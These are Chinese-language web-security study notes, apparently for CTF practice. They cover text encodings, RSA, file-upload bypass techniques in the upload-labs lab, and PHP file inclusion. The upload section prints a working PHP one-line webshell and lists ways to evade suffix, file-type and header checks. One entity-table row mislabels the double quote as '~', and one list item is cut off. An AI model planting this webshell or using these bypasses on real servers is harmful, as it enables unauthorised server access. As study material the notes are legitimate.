将每个字符的十六进制 ASCII 码，并将每个十六进制码改写为 “%” 开头的形式

```
明文：I love you Jack
Hex ASCII 码：0x49 0x20 0x6c0x6f0x760x65 0x20 0x790x6f0x75 0x20 0x4a0x610x630x6b
密文：%49%20%6c%6f%76%65%20%79%6f%75%20%4a%61%63%6b
```

### Unicode 编码

有四种比较常见的表达形式

```
明文：The
形式一(Hex)：&#x0054;&#x0068;&#x0065;
形式二(DEC)：&#00084;&#00104;&#00101;
形式三(HEX)：\u0054;\u0068;\u0065;
形式四(HEX)：\u+0054;\u+0068;\u+0065;
```

### Escape/Unescape 编码

采用 UTF-16BE 字符集，编码以 “%u” 开头

```
明文：The
编码：%u0054;%u0068;%u0065;
```

### HTML 实体编码

HTML 中将部分字符转为了特殊的编码

```
~ -> &quot; 或 &#34;
' -> &apos; 或 &#39;
& -> &amp;  或 &#38;
< -> &lt;   或 &#60;
> -> &gt;   或 &#62;
```

## 非对称加密算法

### RSA 加密

```
加密过程：
（1）找出两个质数 p, q
（2）计算公共魔数 n = p * q
（3）计算欧拉函数 φ(n) = (p -1)(q -1)
（4）选择公钥 e，满足 e 和 φ(n) 互质，即 gcd(e, φ(n)) = 1，额的取值范围为 1 < e < φ(n)。一般 e 取值为 65537(0x10001)
（5）计算私钥 d，e * d ≡ 1 (mod φ(n))，即 e, d 互为逆元
（6）加密，使用公钥 (e, n)，明文 m < n，密文 c = m^e (mod n)
（7）解密，使用私钥 (d, n), 密文 c，明文 m = c^d (mod n)
```



## 常用解密工具

ctf.ssleye.com

factordb.com

xz.aliyun.com

# 文件上传

环境：upload-labs

## 客户端漏洞

客户端校验 = 没有校验

客户端语言 html、js 等仅可以实现一些简单的校验，例如：

1. 字符数量限制（max，min）
2. 隐藏一些内容（hidden）
3. 禁止一些内容（disabled）
4. 对输入的内容进行限制（正则表达式）
5. 等等

当客户端出现以上内容时，可以通过修改页面源码，或浏览器禁用 JS 的方式绕过防御

此外，如果服务端缺乏校验，还可以上传恶意代码，获取服务端权限或各类信息，例如 php 一句话木马

```
<?php @eval($_POST["pass"]);?> 
```

## 服务端漏洞

服务端语言可以实现一些简单的校验，例如：

1. 文件后缀校验

    如果对文件后缀名进行了替换，则可以基于双写等方式，绕过防御；

    如果是对文件名进行了正则校验，则可以考虑替换语句，绕过防御；

    如果设置了黑名单，可以通过寻找替代的文件后缀名进行绕过；黑名单的安全性远不如白名单，白名单几乎无法绕过

2. 文件类型校验

    如果对文件类型进行了校验，则可以通过修改文件头的方式，绕过文件类型校验

    gif 文件头：GIF89a
    jpg 文件头：ffd8dde0

3. 文件头校验

    可以通过：直接在 http 请求报文中修改请求部分，或文件尾追加等方式绕过防御

4. 文件内容校验

    可以通过替代命令或者

## 中间件漏洞

典型如 apache 2.2.14 解析漏洞，文件名从右向左读取，遇到无法解析的会跳过，因此可以通过修改文件名的方式上传木马

# 文件包含

## 文件包含漏洞

php 文件包含函数是使代码更加灵活的一种方式，抽象公共页面片段，并在其他 php 页面中包含它，降低耦合性

1. include：包含的文件出现错误，不影响原有代码的执行，会跳过此错误
2. require：包含的文件出现错误，中断原有代码的执行
3. include_once：如果要包含的文件被包含过（无论通过何种方式），则不会再被包含
4. require_once：如果要包含的文件被包含过（无论通过何种方式），则不会再被包含

如果文件包含函数中包含变量，且没有对包含的内容进行严格的校验，则可能引发文件包含漏洞

文件包含漏洞分为两类：

1. 本地文件包含：只能包含服务器本地的文件
2. 远程文件包含：可以包含任何位置的文件



文件包含漏洞是一种样例，在文件操作函数中，还可能引发其他的漏洞，例如：

1. file_get_contents：可能产生文件读取漏洞
2. file_put_contents：可能产生文件写入漏洞

